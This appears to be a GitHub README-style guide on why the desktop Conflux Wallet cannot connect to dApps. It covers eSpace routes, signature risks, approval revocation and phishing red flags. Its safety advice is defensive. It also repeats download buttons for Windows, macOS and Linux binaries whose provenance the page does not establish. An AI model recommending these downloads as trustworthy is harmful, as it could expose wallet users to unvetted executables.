![Conflux Wallet](assets/banner-article.png)

# Connect Conflux Wallet to a dApp

<p align="center">Connect Conflux Wallet to a dApp: the checks, in order, for the current desktop release.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-30A0D0?style=for-the-badge&labelColor=101010" alt="License: MIT"> <img src="https://img.shields.io/badge/RELEASE-v0.6.14-30A0D0?style=for-the-badge&labelColor=101010" alt="Release v0.6.14"></p>

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

> Only download from this GitHub release page.

**Short answer.** A "Connect wallet" button looks for a browser extension that injects an account into the page. This application is a desktop program, not an extension, so it does not appear in that list - dApp use happens on eSpace, through a browser wallet or a hardware device holding the same account.

## What "connect" means

Connecting is not logging in. The page asks a wallet to reveal an address and to request signatures later; nothing is authenticated and nothing is transferred at that moment. The address is public, which is why the button works without a password.

What the page gets is permission to ask. Every actual movement of funds still requires a signature you approve, and every approval is a separate decision from the connection.

## Why a desktop app is not injected

An extension lives inside the browser and can place a provider object into the page. A desktop application runs outside that sandbox, has no way to inject into a tab, and therefore cannot answer a "connect" button. The current release from the release page (https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14) is exactly that: a program on the machine, not a plug-in inside the page.

This is a structural difference, not a gap in the app's capability. The desktop application is the place your keys live and where staking and Core Space transfers happen; the browser is where dApps live. The two overlap on eSpace only.

## The practical routes

Three, in order of safety. A hardware device holding the eSpace account, connected to the browser wallet the dApp expects. A browser wallet holding an eSpace account you are willing to expose. Or the same phrase imported into a browser wallet deliberately, as a separate copy you control.

The third is legitimate when it is your own phrase into your own wallet, and dangerous when it is done in response to a request. Nothing about connecting requires importing anything, and a dApp that asks you to import is not connecting.

## Using the eSpace account elsewhere

The account is derived from the phrase, so a browser wallet given the same phrase produces the same `0x` address - that is the whole point of a recovery phrase, and it is how people use one account in two places.

If you do this, remember that both copies are now live credentials. A compromise of the browser copy endangers the balance, and the desktop copy is not a backup if the phrase itself is what you copied.

## Device signing with a dApp

The cleaner arrangement: keep the phrase on a hardware device, connect the device to the browser wallet, and let the dApp see the device's eSpace account. Signatures happen on the device, and a malicious page cannot sign without you approving it on a screen it does not control.

https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/connect-ledger-to-conflux-wallet.md covers the device pairing, and https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-wallet-safety.md covers what the device can and cannot protect you from.

## What you are approving

Two different things arrive after connecting: a message signature and a transaction. A message signature can be harmless or can authorise something on your behalf depending on the protocol, and it costs no gas - which is exactly why it feels safe and is not always safe.

Read what is being signed rather than how much it costs. A free signature that grants a permit is a transfer in disguise, and it is the most common way a connected wallet is drained.

## Revoking approvals

Token approvals persist after you leave the site. An unlimited approval to a contract is a standing permission, and a site that goes quiet does not revoke it.

Review and revoke approvals periodically, from the explorer or a tool you trust, and prefer approvals with an exact amount. If a site insists on unlimited, that is information about how it expects to behave.

## Signing messages that are not transactions

A signature over arbitrary text can be replayed by a site that asks for the same text later, and some signing schemes are broad enough to authorise transfers. The defence is the same as everywhere: refuse to sign anything whose purpose you cannot state in one sentence.

Legitimate sites ask for specific, explained signatures - a login nonce, an order, a permit with a visible amount. A page that asks for a signature and cannot say what it does is a page to close.

## Red flags

A dApp that asks for your recovery phrase, that wants you to "sync" by pasting a keystore, that offers to raise your balance, or that arrived through a direct message, is hostile. So is any site that looks like a project you know but has a slightly different address. The test is not whether the page looks right, but whether you can say in one sentence what it is about to do.

The product's own rules are a useful standard: it never messages first offering help, and no support process needs a phrase. https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-wallet-fake-support.md covers the shapes those approaches take. https://github.com/conflux-developments/setup-handbook/blob/HEAD/what-is-conflux-wallet.md covers what this application is and is not, and https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-address-formats-cfx-vs-0x.md covers why a `cfx:` address will never work in a dApp that expects `0x`. The wallet is actively maintained, and the current release from the release page is the one to run.

## FAQ

### Can I connect Conflux Wallet to a dApp?

Not by a connect button: it is a desktop app, not a browser extension. dApp use happens on eSpace via a browser wallet or a hardware device holding the account.

### Why does the site not list my wallet?

The site lists browser extensions that inject a provider. A desktop application cannot appear in that list, whatever version you run.

### Is importing my phrase into a browser wallet safe?

It creates a second live copy. It is your own phrase in your own wallet, and it doubles the attack surface; a hardware device avoids that.

### Do I have to approve every transaction separately?

Yes. Connecting only lets the page ask. Each transfer or approval needs its own signature, and each is a separate decision.

### Can a signature be dangerous if it costs no gas?

Yes. Gas-free message signatures can authorise transfers. Read what is being signed, not what it costs.

### How do I undo a connection?

Disconnect in the site and revoke token approvals separately. Leaving the site does not revoke a standing approval - a site that has gone quiet does not revoke it either.

---

## Get Conflux Wallet

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

## Related guides

- [What Is Conflux Wallet?](https://github.com/conflux-developments/setup-handbook/blob/HEAD/what-is-conflux-wallet.md)
- [Update Conflux Wallet to the Current Release](https://github.com/conflux-developments/setup-handbook/blob/HEAD/update-conflux-wallet-to-latest-release.md)
- [Conflux Wallet Download and Current Release](https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-wallet-download-guide.md)

[All Conflux Wallet guides](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)
